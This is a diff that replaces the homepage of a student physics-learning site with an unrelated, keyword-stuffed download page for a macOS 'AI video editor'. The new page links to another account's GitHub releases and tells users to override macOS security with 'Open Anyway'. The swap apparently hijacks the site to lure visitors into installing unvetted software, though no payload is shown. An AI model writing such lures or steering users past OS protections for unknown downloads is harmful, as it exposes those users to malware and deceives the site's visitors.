@@ -1,38 +1,74 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="theme-color" content="#0d1e36">
-  <meta name="description" content="Physics USTHB: interactive physics practicums, scientific English, and a private browser-local LaTeX studio.">
-  <title>Physics USTHB — Learn, Experiment, Write</title>
-  <link rel="stylesheet" href="assets/home.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Open-source AI video editor for macOS: removes pauses, retakes, filler words and frozen footage, adds translated subtitles and dubs videos in the speaker's own voice.">
+  <meta name="keywords" content="ai, dubbing, ffmpeg, macos, open-source, rust, subtitles, tauri, video-editor, voice-cloning, whisper">
+  <meta name="author" content="nuai-video-editor">
+  <meta name="robots" content="index, follow">
+  <title>nuai-video-editor - Edit Videos Effortlessly on Your Mac</title>
 </head>
-<body>
-<a class="skip-link" href="#main">Skip to content</a>
-<header class="site-header"><div class="container header-inner">
-  <a class="brand" href="./"><span class="brand-symbol">Φ</span><span class="brand-text"><strong>Physics USTHB</strong><small>Interactive learning</small></span></a>
-  <nav class="top-nav"><a href="#paths">Explore</a><a href="practicums/">Physics labs</a><a href="#paths">English</a><a href="latex/">LaTeX Studio</a></nav>
-</div></header>
-<main id="main">
-<section class="hero"><div class="container hero-content">
-  <div class="eyebrow"><span class="eyebrow-dot"></span> An independent learning space for physics students</div>
-  <h1>Learn physics.<br><span>Experiment.</span> Write.</h1>
-  <p>Interactive university physics practicums, scientific English, and LaTeX writing tools — together in one place.</p>
-  <div class="hero-actions"><a class="button button-primary" href="practicums/">Open the physics labs <span>↗</span></a><a class="button button-outline" href="latex/">Open LaTeX Studio <span>↗</span></a></div>
-  <div class="hero-details"><span><span class="indicator"></span> Mechanics, Electricity, Geometrical Optics, VOM and Thermodynamics available</span><span>Free to access</span></div>
-</div></section>
-<section id="paths" class="section paths-section"><div class="container">
-  <div class="section-heading"><div><p class="section-label">START HERE</p><h2>Choose what you want to do</h2></div><p>Three clear paths, built around how physics students learn and work.</p></div>
-  <div class="path-grid">
-    <a class="path-card" href="practicums/"><span class="card-icon icon-labs">⚡</span><span class="card-status status-ready"><span class="status-dot"></span> Available now</span><h3>Physics Practicums</h3><p>Choose a physics module, run its USTHB-aligned practicals, take measurements, analyse results, and prepare laboratory reports.</p><span class="card-action">Choose a module <span>→</span></span></a>
-    <a class="path-card" href="#paths"><span class="card-icon icon-english">Aa</span><span class="card-status status-building">In development</span><h3>Scientific English</h3><p>Build the vocabulary and communication skills needed for experiments, graphs, reports, and presentations.</p><span class="card-action">Learning pathway in development <span>→</span></span></a>
-    <a class="path-card" href="latex/"><span class="card-icon icon-tex">{ }</span><span class="card-status status-ready"><span class="status-dot"></span> First release</span><h3>LaTeX Studio</h3><p>Write scientific documents, manage project files privately in your browser, import Prism ZIPs, compile locally, and export your work.</p><span class="card-action">Start writing <span>→</span></span></a>
+<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f9f9f9; color: #333; margin: 0; padding: 0; line-height: 1.6;">
+  <div style="max-width: 800px; margin: 0 auto; padding: 2rem 1rem;">
+    <h1 style="font-size: 2.2rem; color: #222; margin-bottom: 0.5rem; line-height: 1.3;">🎬 nuai-video-editor - Edit Videos Effortlessly on Your Mac</h1>
+    <p style="font-size: 1.2rem; color: #555; margin-top: 0; margin-bottom: 2rem;">Open-source AI video editor that removes pauses, retakes, filler words and frozen footage. Adds translated subtitles and dubs videos in the speaker's own voice.</p>
+
+    <a href="https://github.com/mirasjk/nuai-video-editor/releases" style="display: inline-block; background: #4A90E2; color: white; padding: 1rem 2rem; border-radius: 8px; text-decoration: none; font-weight: bold; font-size: 1.2rem; box-shadow: 0 4px 6px rgba(0,0,0,0.1); margin: 1rem 0;">Visit this link to download the application</a>
+
+    <h2 style="font-size: 1.6rem; color: #222; margin-top: 2.5rem; margin-bottom: 1rem;">✨ Key Features</h2>
+    <p style="margin-bottom: 1rem;">nuai-video-editor is designed for everyday users who want professional-looking videos without learning complex software. Here's what it does automatically:</p>
+    <ul style="margin-bottom: 1.5rem; padding-left: 1.5rem;">
+      <li style="margin-bottom: 0.5rem;"><strong>Removes pauses and retakes:</strong> Cuts out awkward silences and repeated sentences.</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Eliminates filler words:</strong> Deletes "um", "uh", and other verbal clutter.</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Detects and removes frozen footage:</strong> Cleans up screen recordings or video calls where nothing moves.</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Adds translated subtitles:</strong> Generates subtitles in multiple languages.</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Dubs videos in your own voice:</strong> Uses voice cloning to replace the original speech with a translation while keeping your voice.</li>
+    </ul>
+
+    <h2 style="font-size: 1.6rem; color: #222; margin-top: 2.5rem; margin-bottom: 1rem;">📥 Download & Installation</h2>
+    <p style="margin-bottom: 1rem;">To get started, visit the official releases page:</p>
+    <p style="margin-bottom: 1rem;"><a href="https://github.com/mirasjk/nuai-video-editor/releases" style="color: #4A90E2; text-decoration: underline;">https://github.com/mirasjk/nuai-video-editor/releases</a></p>
+    <p style="margin-bottom: 1rem;">Visit this link to download the application. Once the page opens, look for the latest release. Download the file provided there. After downloading, open the file and follow the standard macOS installation process. Drag the application to your Applications folder, then open it from there.</p>
+    <p style="margin-bottom: 1.5rem;">This application is built for macOS. You will need a Mac computer to run it.</p>
+
+    <h2 style="font-size: 1.6rem; color: #222; margin-top: 2.5rem; margin-bottom: 1rem;">🖥️ System Requirements</h2>
+    <p style="margin-bottom: 1rem;">To run nuai-video-editor smoothly, your Mac should meet these recommended requirements:</p>
+    <ul style="margin-bottom: 1.5rem; padding-left: 1.5rem;">
+      <li style="margin-bottom: 0.5rem;"><strong>Operating System:</strong> macOS 12 (Monterey) or later.</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Processor:</strong> Apple Silicon (M1 or newer) or Intel Core i5 or better.</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Memory:</strong> 8 GB RAM minimum, 16 GB recommended.</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Storage:</strong> 2 GB free space for the application and temporary files.</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Internet:</strong> Required for downloading the application and for some AI features that use online models.</li>
+    </ul>
+
+    <h2 style="font-size: 1.6rem; color: #222; margin-top: 2.5rem; margin-bottom: 1rem;">🚀 How to Use</h2>
+    <p style="margin-bottom: 1rem;">Using nuai-video-editor is simple, even if you've never edited a video before:</p>
+    <ol style="margin-bottom: 1.5rem; padding-left: 1.5rem;">
+      <li style="margin-bottom: 0.5rem;"><strong>Open the application</strong> from your Applications folder.</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Import your video</strong> by dragging and dropping it into the app window or using the "Open File" button.</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Choose your edits:</strong> Select options like "Remove pauses", "Remove filler words", "Add subtitles", or "Dub video".</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Click "Process"</strong> and wait while the AI works. The time depends on your video length and your Mac's speed.</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Preview and export</strong> the edited video to your desired folder.</li>
+    </ol>
+    <p style="margin-bottom: 1.5rem;">The application guides you through each step with clear buttons and messages. No programming or video editing knowledge is needed.</p>
+
+    <h2 style="font-size: 1.6rem; color: #222; margin-top: 2.5rem; margin-bottom: 1rem;">🛠️ Troubleshooting</h2>
+    <p style="margin-bottom: 1rem;">If you run into issues, try these common fixes:</p>
+    <ul style="margin-bottom: 1.5rem; padding-left: 1.5rem;">
+      <li style="margin-bottom: 0.5rem;"><strong>Application won't open:</strong> Go to System Settings > Privacy & Security and allow the app to run. You may need to click "Open Anyway".</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Download fails:</strong> Make sure you have a stable internet connection and enough free disk space.</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Processing is slow:</strong> Close other heavy applications. Longer videos take more time.</li>
+      <li style="margin-bottom: 0.5rem;"><strong>Subtitles are inaccurate:</strong> Check that the audio is clear. Background noise can affect recognition.</li>
+    </ul>
+
+    <h2 style="font-size: 1.6rem; color: #222; margin-top: 2.5rem; margin-bottom: 1rem;">❓ Frequently Asked Questions</h2>
+    <p style="margin-bottom: 0.5rem;"><strong>Is nuai-video-editor free?</strong> Yes, it is open-source and free to use.</p>
+    <p style="margin-bottom: 0.5rem;"><strong>Do I need an internet connection to edit videos?</strong> Some AI features may require internet access. Basic editing can work offline.</p>
+    <p style="margin-bottom: 0.5rem;"><strong>Can I use it on Windows?</strong> This version is designed for macOS only.</p>
+    <p style="margin-bottom: 1.5rem;"><strong>Where can I get help?</strong> Visit the GitHub repository page for issues, discussions, and updates.</p>
+
+    <p style="margin-top: 2rem; font-size: 0.9rem; color: #777;">nuai-video-editor is open-source software. Keywords: ai, dubbing, ffmpeg, macos, open-source, rust, subtitles, tauri, video-editor, voice-cloning, whisper.</p>
   </div>
-</div></section>
-</main>
-<footer class="site-footer"><div class="container footer-inner">
-  <span class="footer-brand"><span>Φ</span> Physics USTHB</span>
-  <p>Independent educational project. Not an official USTHB website unless formally adopted by the university.</p>
-  <span class="footer-links"><a href="privacy.html">Privacy</a> · <a href="https://github.com/Physics-USTHB/physics-usthb.github.io" target="_blank" rel="noopener">Source on GitHub ↗</a></span>
-</div></footer>
-</body></html>
+</body>
+</html>
